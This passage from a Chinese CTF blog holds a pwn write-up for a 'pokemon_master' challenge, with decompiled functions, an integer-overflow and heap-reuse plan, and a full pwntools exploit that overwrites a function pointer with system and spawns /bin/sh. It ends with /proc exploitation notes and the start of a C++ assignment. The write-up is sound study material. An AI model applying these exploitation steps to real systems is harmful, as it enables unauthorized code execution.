class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">16LL</span>) = <span class="number">31</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">24LL</span>) = <span class="number">10</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) = <span class="number">11</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) = <span class="number">10</span>;</span><br><span class="line">          Pokemon_name(a1, <span class="string">&quot;Bulbasaur&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          *(_QWORD *)a1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">16LL</span>) = <span class="number">21</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">24LL</span>) = <span class="number">16</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) = <span class="number">8</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) = <span class="number">14</span>;</span><br><span class="line">          Pokemon_name(a1, <span class="string">&quot;Pikapi&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          *(_QWORD *)a1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">16LL</span>) = <span class="number">25</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">24LL</span>) = <span class="number">12</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) = <span class="number">14</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) = <span class="number">14</span>;</span><br><span class="line">          Pokemon_name(a1, <span class="string">&quot;Charmander&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)a1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)a1 + <span class="number">16LL</span>) = <span class="number">28</span>;</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)a1 + <span class="number">24LL</span>) = <span class="number">9</span>;</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) = <span class="number">20</span>;</span><br><span class="line">  *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) = <span class="number">9</span>;</span><br><span class="line">  Pokemon_name(a1, <span class="string">&quot;Squirtle&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SThj8">case1 ：Store</h3><p>是一个商店，卖攻击药剂和防御药剂还有精灵球，买精灵球会有change++，猜测是改名机会。</p><p>防御剂是攻击下降，防御上升。攻击剂是攻击上升，防御下降。</p><p>攻击是a1+20</p><p>防御是a1+28</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">Store</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;m a merchant from GuanDu city, what do you want to buy?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1.Attack agents&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2.Defensive agents&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(a3Pok);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4.EXIT&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          money -= <span class="number">75</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Are you sure this is not a name change card?&quot;</span>);</span><br><span class="line">          v3 = <span class="built_in">malloc</span>(<span class="number">0xF</span>uLL);</span><br><span class="line">          ++change;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          money -= <span class="number">75</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) += <span class="number">10</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) -= <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          money -= <span class="number">75</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">20LL</span>) -= <span class="number">10</span>;</span><br><span class="line">          *(_DWORD *)(*(_QWORD *)a1 + <span class="number">28LL</span>) += <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_11:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You say: f**king Black-hearted businessman&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nz0qf">case 2 : out</h3><p>外出函数，分析下来就是左转遇到小精灵能够赚钱，右转遇到神兽，打赢了就会free掉一个（ex1t所在的）chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">Out</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  Outmenu();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;You haven&#x27;t encountered a beast, but you&#x27;ve encountered a TAT that guards the treasure, so try to stun it for some loot&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TAT: WTF!&quot;</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">6</span>) = <span class="number">15</span>;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">5</span>) = <span class="number">1</span>;</span><br><span class="line">    Pokemon_name(&amp;ptr, <span class="string">&quot;TAT&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)Fight(a1, ptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Your earn some money~&quot;</span>);</span><br><span class="line">      money += <span class="number">200</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Loser...&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re very lucky, it&#x27;s the Divine Beast QWQ that roars in front of you, let&#x27;s grab it and knock it out first!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;QWQ: qwq~ qwq~ qwq~ qwq~ qwq~ qwq~&quot;</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">4</span>) = <span class="number">9999</span>;</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">6</span>) = <span class="number">15</span>;</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">7</span>) = <span class="number">9999</span>;</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">5</span>) = <span class="number">9999</span>;</span><br><span class="line">  Pokemon_name(&amp;ptr, <span class="string">&quot;QWQ&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)Fight(a1, ptr) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The soul of the mythical beast flew away...&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ex1t);</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到了Fight函数让两个精灵进行决斗。</p><p>Fight函数里面选攻击就好了(就不逆向了，都是一些实现蘸豆的逻辑)，但是你要速度快并且一刀能打死QWQ。</p><h3 id="Dtk36">case 3 : Status</h3><p>对当前状况进行查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Status</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your money: %d\n&quot;</span>, money);</span><br><span class="line">  <span class="built_in">puts</span>(aTheStatusOfYou);</span><br><span class="line">  Pokemon_print(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Over~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sYL4q">case 4 : ex1t</h3><p>使用了函数指针执行退出函数，并且能够控制第一个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 == <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWhat you want to say?&quot;</span>);</span><br><span class="line">  gets(v7);</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(_BYTE *))ex1t)(v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ci7r5">case 666 : gift</h3><p>会分配一个0x20大小的堆，并且能够改写一部分内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 == <span class="number">666</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(aWhyDoesTechnol);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  *((_DWORD *)buf + <span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_DWORD *)buf + <span class="number">6</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_DWORD *)buf + <span class="number">5</span>) = <span class="number">1</span>;</span><br><span class="line">  *((_DWORD *)buf + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s so weak...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="YrD4o">0x2 思路</h2><p><strong>开局给了libc地址，这怎么输？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">*((_DWORD *)ptr + <span class="number">4</span>) = <span class="number">9999</span>;</span><br><span class="line">*((_DWORD *)ptr + <span class="number">6</span>) = <span class="number">15</span>;</span><br><span class="line">*((_DWORD *)ptr + <span class="number">7</span>) = <span class="number">9999</span>;</span><br><span class="line">*((_DWORD *)ptr + <span class="number">5</span>) = <span class="number">9999</span>;</span><br><span class="line">Pokemon_name(&amp;ptr, <span class="string">&quot;QWQ&quot;</span>);</span><br></pre></td></tr></table></figure><p>简单观察神兽只有这项属性  *((_DWORD <em>)ptr + 6) &#x3D; 15最低，</em>ptr是我们堆刚开始的地方</p><p>这里Dword是4字节，所以也就是ptr+6*4&#x3D;ptr+24</p><p>我们选精灵的时候，要选这个属性大于QWQ的，才有可能取得胜利。</p><p>也就是我们的Pikapi！</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730780048067-d4d36499-fba8-492f-a9b4-ae20068a788d.png"></p><p>在FIght函数逻辑中，有以下片段，这里其实都是通过计算精灵的属性值，来实现蘸豆。我们不妨设想一下，它们中很有可能就包含精灵的攻击属性和防御属性。虽有大部分都是int类型，但是实际上是无符号类型在运算</p><blockquote><p><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;*(_QWORD *)&lt;/font&gt;</code><font style="color:rgb(77, 77, 77);"> 允许你在不知道原始数据类型的情况下，以特定的方式（这里是64位无符号整数）解释和访问内存中的数据。</font></p></blockquote><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730780204448-5e423477-483b-4c8c-8804-08947db56a99.png"></p><p>所以我们选取皮卡丘，在打败两次小怪之后，买防御剂，让自己的攻击溢出到负数，但是比较用的是Qword所以实际上还是unsigned int，此时速度比QWQ快，能够一击秒杀QWQ。这样会free掉特殊堆块，利用case666，然后申请两次申请回特殊堆块（因为第一次是QWQ的堆块。），之后改写ex1t的hook为system即可getshell。</p><p>free掉的两个堆块进入bin</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730784652575-2a9b6bd4-fae5-417d-a4a0-02d60624d70a.png"></p><h2 id="JvWYa">0X3 exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(log_level=<span class="string">&quot;debug&quot;</span>)</span></span><br><span class="line">p=process(<span class="string">&quot;./pokemon_master&quot;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;43.248.97.213&quot;</span>,30058)</span></span><br><span class="line">def <span class="title function_">cmd</span><span class="params">(i)</span>:</span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,str(i))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#choose pikapi</span></span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">1</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#recv libcaddr</span></span><br><span class="line">p.<span class="title function_">recvuntil</span><span class="params">(<span class="string">&quot;gift:0x&quot;</span>)</span></span><br><span class="line">puts_addr=<span class="type">int</span>(p.recv(<span class="number">12</span>)[<span class="number">-12</span>:].rjust(<span class="number">16</span>,b<span class="number">&#x27;0&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;puts&quot;</span>,hex(puts_addr))</span><br><span class="line">libcbase=puts_addr<span class="number">-0x080e50</span></span><br><span class="line">system=libcbase+<span class="number">0x050d70</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#attack TAT</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#buy defense agents</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line"><span class="meta">#attack QWQ</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#one gadgte</span></span><br><span class="line">one=[<span class="number">0x50a47</span>+libcbase,<span class="number">0xebc81</span>+libcbase,<span class="number">0xebc85</span>+libcbase,<span class="number">0xebc88</span>+libcbase]</span><br><span class="line"></span><br><span class="line">#CMD <span class="number">666</span> backdoor</span><br><span class="line">cmd(<span class="number">666</span>)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line">cmd(<span class="number">666</span>)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line">print(<span class="string">&quot;libcbase&quot;</span>,hex(libcbase))</span><br><span class="line"><span class="meta">#gdb.attach(p,<span class="string">&quot;b *$rebase(0x137b)&quot;</span>)</span></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h1><h1 id="wahahabox"><a href="#wahahabox" class="headerlink" title="wahahabox"></a>wahahabox</h1><p>提示：&#x2F;proc下的文件非常有用</p><p>&#x2F;proc&#x2F;self&#x2F;当前存储进程信息的目录</p><p>environ</p><p>exe</p><p>fd</p><p>maps</p><p>映射信息</p><p>libc地址，elf地址，ld地址</p><p>libc上有用的东西</p><p>system binsh，one_gadget，mprotect, IO_File</p><p> &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6  </p><p>&#x2F;proc&#x2F;self&#x2F;mem</p><p>就算是只读的rodata段上的数据也是可以的。</p><p>open、read和lseek才有可能完成内存改写的利用。</p><p>ida7.7  插件比较多， 逆向可能需要</p><p>ida8.3  </p><p>ida9.0  比较新，支持很多新特性</p><p>类型转换的问题</p><p>int的数据转换成unsigned的数据，未经过处理的话，就会有问题。</p><p>-1   bigbigbig</p><p>0xffffffffff…..</p><p>Qword  &lt;-&gt;   size_t</p><p>Dword  &lt;-&gt;  unsigned</p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfwp </tag>
            
            <tag> 2024wp </tag>
            
            <tag> 出题笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++第三次小项目——文本查询程序</title>
      <link href="/2024/11/08/C-%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E6%96%87%E6%9C%AC%E6%9F%A5%E8%AF%A2%E7%A8%8B%E5%BA%8F/"/>
      <url>/2024/11/08/C-%E7%AC%AC%E4%B8%89%E6%AC%A1%E5%B0%8F%E9%A1%B9%E7%9B%AE%E2%80%94%E2%80%94%E6%96%87%E6%9C%AC%E6%9F%A5%E8%AF%A2%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>:::info<br><strong><font style="color:rgb(0,0,0);">题目：文本查询程序 </font></strong></p><p><font style="color:rgb(0,0,0);">实现一个文本查询程序。 </font></p><p><strong><font style="color:rgb(0,0,0);">需求 </font></strong></p><p><font style="color:rgb(0,0,0);">1. 使用 C++ 完成代码，确保程序可由 C++ 编译器（如g++）编译。 </font></p><p><font style="color:rgb(0,0,0);">2. </font><font style="color:rgb(0,0,0);">采用面向对象的思想编写程序，以使程序更为优雅可靠。程序应该尽可能符合正常使用习 </font></p><p><font style="color:rgb(0,0,0);">惯。 </font></p><p><font style="color:rgb(0,0,0);">3. </font><font style="color:rgb(0,0,0);">程序实现两个功能，一个是</font><strong><font style="color:rgb(0,0,0);">文件格式化</font></strong><font style="color:rgb(0,0,0);">功能，另一个是</font><strong><font style="color:rgb(0,0,0);">文本查询</font></strong><font style="color:rgb(0,0,0);">功能，打开程序时可以选 </font></p><p><font style="color:rgb(0,0,0);">择功能，类似如下 </font></p><p><font style="color:rgb(0,0,0);">选择需要的功能： </font></p><p><font style="color:rgb(0,0,0);">1. </font><font style="color:rgb(0,0,0);">文件格式化 </font></p><p><font style="color:rgb(0,0,0);">2. </font><font style="color:rgb(0,0,0);">文本查询 </font></p><p><font style="color:rgb(0,0,0);">3. </font><font style="color:rgb(0,0,0);">退出 </font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">4. </font><font style="color:rgb(0,0,0);">进入文件格式化功能，程序会根据用户后续输入的文件位置（绝对地址或相对地址）和文 </font></p><p><font style="color:rgb(0,0,0);">件名读取文件，并由用户指定每行最大字符数</font><font style="color:rgb(0,0,0);"> n</font><font style="color:rgb(0,0,0);">，处理文件，使得文件在行数到达</font><font style="color:rgb(0,0,0);"> n </font><font style="color:rgb(0,0,0);">时进 </font></p><p><font style="color:rgb(0,0,0);">行换行（若为英文，需要切断单词时，提前换行，避免单词被切断，且需使得标点符号不 </font></p><p><font style="color:rgb(0,0,0);">在行首），并由用户指定保存新文件的位置与新文件名，若位置与新文件名已存在，由用 </font></p><p><font style="color:rgb(0,0,0);">户确认是否替换（原有文件内容不可改变，除非新文件与原文件在相同位置且有相同文件 </font></p><p><font style="color:rgb(0,0,0);">名，并被确认替换）。 </font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">5. </font><font style="color:rgb(0,0,0);">文本查询允许用户指定一个文件（给定文件位置与文件名），并在其中查询单词，查询结 </font></p><p><font style="color:rgb(0,0,0);">果是单词在文件中出现的次数及其所在行的列表。如果一个单词在一行中出现多次，此行 </font></p><p><font style="color:rgb(0,0,0);">只列出一次。行会按照升序输出，即第</font><font style="color:rgb(0,0,0);">7</font><font style="color:rgb(0,0,0);">行会在第</font><font style="color:rgb(0,0,0);">9</font><font style="color:rgb(0,0,0);">行之前显示，以此类推。如果查询不 </font></p><p><font style="color:rgb(0,0,0);">到，则不输出。</font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">6. </font><font style="color:rgb(0,0,0);">文本查询功能可以通过交互式的方式保存用户输入的</font><strong><font style="color:rgb(0,0,0);">字符串</font></strong><font style="color:rgb(0,0,0);">（与项目二一样，忽略输入时 </font></p><p><font style="color:rgb(0,0,0);">的各种空格），并可以支持逻辑查询操作（各种逻辑运算）。</font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">10. </font><font style="color:rgb(0,0,0);">尝试支持批量读取文件，并进行针对多文件的查询。 </font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">11. </font><font style="color:rgb(0,0,0);">尝试支持将查询结果输出到新文件中，而非打印，如 </font></p><p><font style="color:rgb(0,0,0);">&gt;&gt;&gt; a | b &gt;&gt; .&#x2F;result.txt </font><em><font style="color:rgb(0,128,0);">#</font></em><font style="color:rgb(0,128,0);">将结果输出到当前目录的文件</font><em><font style="color:rgb(0,128,0);">result.txt</font></em><font style="color:rgb(0,128,0);">中 </font></p><p><font style="color:rgb(0,128,0);"></font></p><p><font style="color:rgb(0,0,0);">12. </font><font style="color:rgb(0,0,0);">可尝试多种方式对代码进行优化，包括执行速度、功能等；可以尝试完善错误提示，让错 </font></p><p><font style="color:rgb(0,0,0);">误提示更加明确；可内嵌帮助文档，通过特定指令能够输出对应帮助文档。 </font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">13. </font><font style="color:rgb(0,0,0);">可以使用</font><font style="color:rgb(0,0,0);"> STL </font><font style="color:rgb(0,0,0);">等库进行实现，但不能直接采用功能非常类似的他人的程序。 </font></p><p><font style="color:rgb(0,0,0);"></font></p><p><font style="color:rgb(0,0,0);">14. </font><font 